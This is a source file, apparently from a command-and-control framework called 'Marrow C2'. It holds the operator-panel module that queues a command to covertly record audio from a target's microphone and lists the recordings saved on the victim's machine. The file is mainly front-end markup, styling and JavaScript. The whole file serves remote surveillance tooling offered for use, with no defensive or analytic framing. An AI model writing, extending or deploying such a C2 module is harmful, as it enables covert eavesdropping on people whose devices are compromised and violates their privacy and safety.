<?php
// Marrow C2 - Microphone Module
// Record audio from target microphone
?>
<div id="mic-container" class="h-full flex flex-col bg-[#030712]">
    <!-- Toolbar -->
    <div class="h-14 bg-[#0a0f1a] border-b border-[#1e2433] flex items-center justify-between px-4">
        <div class="flex items-center gap-4">
            <span class="text-white font-medium">🎤 Microphone</span>
            <span id="mic-status" class="text-xs px-2 py-1 bg-[#1a1f2e] rounded-lg text-gray-400">Ready</span>
        </div>
        <div class="flex items-center gap-3">
            <div class="flex items-center gap-2 bg-[#0f1219] border border-[#2a3142] rounded-xl px-3 py-1.5">
                <span class="text-xs text-gray-400">Duration:</span>
                <select id="mic-duration" class="bg-transparent text-white text-sm focus:outline-none">
                    <option value="5">5 sec</option>
                    <option value="10" selected>10 sec</option>
                    <option value="30">30 sec</option>
                    <option value="60">1 min</option>
                </select>
            </div>
            <button onclick="MIC.record()" id="mic-record-btn"
                class="px-5 py-2.5 bg-gradient-to-r from-[#ef4444] to-[#dc2626] hover:from-[#dc2626] hover:to-[#b91c1c] text-white rounded-xl text-sm font-medium transition-all flex items-center gap-2">
                🔴 Record
            </button>
        </div>
    </div>

    <!-- Main Content -->
    <div class="flex-1 flex items-center justify-center p-6">
        <div class="text-center max-w-lg">
            <!-- Visualizer -->
            <div id="mic-visualizer" class="mb-8">
                <div class="flex items-end justify-center gap-1 h-32">
                    <div class="mic-bar w-2 bg-gradient-to-t from-[#ef4444] to-[#f87171] rounded-t transition-all"
                        style="height: 20%"></div>
                    <div class="mic-bar w-2 bg-gradient-to-t from-[#ef4444] to-[#f87171] rounded-t transition-all"
                        style="height: 40%"></div>
                    <div class="mic-bar w-2 bg-gradient-to-t from-[#ef4444] to-[#f87171] rounded-t transition-all"
                        style="height: 60%"></div>
                    <div class="mic-bar w-2 bg-gradient-to-t from-[#ef4444] to-[#f87171] rounded-t transition-all"
                        style="height: 80%"></div>
                    <div class="mic-bar w-2 bg-gradient-to-t from-[#ef4444] to-[#f87171] rounded-t transition-all"
                        style="height: 100%"></div>
                    <div class="mic-bar w-2 bg-gradient-to-t from-[#ef4444] to-[#f87171] rounded-t transition-all"
                        style="height: 80%"></div>
                    <div class="mic-bar w-2 bg-gradient-to-t from-[#ef4444] to-[#f87171] rounded-t transition-all"
                        style="height: 60%"></div>
                    <div class="mic-bar w-2 bg-gradient-to-t from-[#ef4444] to-[#f87171] rounded-t transition-all"
                        style="height: 40%"></div>
                    <div class="mic-bar w-2 bg-gradient-to-t from-[#ef4444] to-[#f87171] rounded-t transition-all"
                        style="height: 20%"></div>
                </div>
            </div>

            <!-- Timer -->
            <div id="mic-timer" class="text-5xl font-mono text-white mb-4 hidden">00:00</div>

            <!-- Info -->
            <div id="mic-info">
                <h3 class="text-xl text-gray-300 mb-2">Audio Recording</h3>
                <p class="text-sm text-gray-500">Select duration and click Record to capture audio from target's
                    microphone</p>
            </div>

            <!-- Recording indicator -->
            <div id="mic-recording" class="hidden">
                <div class="flex items-center justify-center gap-3 text-red-400 mb-4">
                    <div class="w-3 h-3 bg-red-500 rounded-full animate-pulse"></div>
                    <span class="text-lg font-medium">Recording...</span>
                </div>
                <p class="text-sm text-gray-500">Audio is being captured on target system</p>
            </div>
        </div>
    </div>

    <!-- Recordings List -->
    <div class="h-48 bg-[#0a0f1a] border-t border-[#1e2433] p-4 overflow-auto">
        <div class="text-xs text-gray-500 uppercase tracking-wider mb-3">Recordings</div>
        <div id="mic-recordings" class="space-y-2">
            <div class="text-sm text-gray-600 text-center py-4">No recordings yet</div>
        </div>
    </div>
</div>

<style>
    .mic-bar {
        opacity: 0.3;
    }

    .recording .mic-bar {
        animation: pulse-bar 0.5s infinite alternate;
        opacity: 1;
    }

    @keyframes pulse-bar {
        from {
            transform: scaleY(0.5);
        }

        to {
            transform: scaleY(1);
        }
    }

    .mic-bar:nth-child(1) {
        animation-delay: 0s;
    }

    .mic-bar:nth-child(2) {
        animation-delay: 0.1s;
    }

    .mic-bar:nth-child(3) {
        animation-delay: 0.2s;
    }

    .mic-bar:nth-child(4) {
        animation-delay: 0.3s;
    }

    .mic-bar:nth-child(5) {
        animation-delay: 0.4s;
    }

    .mic-bar:nth-child(6) {
        animation-delay: 0.3s;
    }

    .mic-bar:nth-child(7) {
        animation-delay: 0.2s;
    }

    .mic-bar:nth-child(8) {
        animation-delay: 0.1s;
    }

    .mic-bar:nth-child(9) {
        animation-delay: 0s;
    }
</style>

<script>
    const MIC = {
        recordings: [],
        isRecording: false,
        timerInterval: null,
        seconds: 0,
        duration: 10,

        record() {
            if (this.isRecording) return;

            this.duration = parseInt(document.getElementById('mic-duration').value);
            this.isRecording = true;
            this.seconds = 0;

            // Update UI
            document.getElementById('mic-status').textContent = 'Recording';
            document.getElementById('mic-status').classList.add('text-red-400');
            document.getElementById('mic-info').classList.add('hidden');
            document.getElementById('mic-recording').classList.remove('hidden');
            document.getElementById('mic-timer').classList.remove('hidden');
            document.getElementById('mic-visualizer').classList.add('recording');
            document.getElementById('mic-record-btn').disabled = true;
            document.getElementById('mic-record-btn').classList.add('opacity-50');

            // Start timer
            this.updateTimer();
            this.timerInterval = setInterval(() => {
                this.seconds++;
                this.updateTimer();

                if (this.seconds >= this.duration) {
                    this.stopRecording();
                }
            }, 1000);

            // Send command
            queueCommand('microphone', this.duration.toString());
        },

        updateTimer() {
            const mins = Math.floor(this.seconds / 60).toString().padStart(2, '0');
            const secs = (this.seconds % 60).toString().padStart(2, '0');
            document.getElementById('mic-timer').textContent = `${mins}:${secs}`;
        },

        stopRecording() {
            clearInterval(this.timerInterval);
            this.isRecording = false;

            document.getElementById('mic-status').textContent = 'Processing...';
            document.getElementById('mic-status').classList.remove('text-red-400');
            document.getElementById('mic-status').classList.add('text-yellow-400');
            document.getElementById('mic-visualizer').classList.remove('recording');
        },

        render(data) {
            document.getElementById('mic-recording').classList.add('hidden');
            document.getElementById('mic-info').classList.remove('hidden');
            document.getElementById('mic-record-btn').disabled = false;
            document.getElementById('mic-record-btn').classList.remove('opacity-50');
            document.getElementById('mic-timer').classList.add('hidden');
            document.getElementById('mic-status').classList.remove('text-yellow-400');

            if (data.includes('error') || data.includes('failed')) {
                document.getElementById('mic-status').textContent = 'Error';
                document.getElementById('mic-status').classList.add('text-red-400');
                return;
            }

            document.getElementById('mic-status').textContent = 'Recorded';
            document.getElementById('mic-status').classList.add('text-green-400');

            // Add to recordings list
            const now = new Date().toLocaleTimeString();
            this.recordings.unshift({
                time: now,
                duration: this.duration
            });
            this.updateRecordings();
        },

        updateRecordings() {
            const list = document.getElementById('mic-recordings');
            if (this.recordings.length === 0) {
                list.innerHTML = '<div class="text-sm text-gray-600 text-center py-4">No recordings yet</div>';
                return;
            }

            list.innerHTML = this.recordings.map((rec, i) => `
            <div class="flex items-center justify-between bg-[#0f1219] border border-[#1e2433] rounded-xl px-4 py-3">
                <div class="flex items-center gap-3">
                    <span class="text-2xl">🎵</span>
                    <div>
                        <div class="text-sm text-white">Recording #${this.recordings.length - i}</div>
                        <div class="text-xs text-gray-500">${rec.time} • ${rec.duration}s</div>
                    </div>
                </div>
                <span class="text-xs text-gray-500">Saved on target</span>
            </div>
        `).join('');
        }
    };
</script>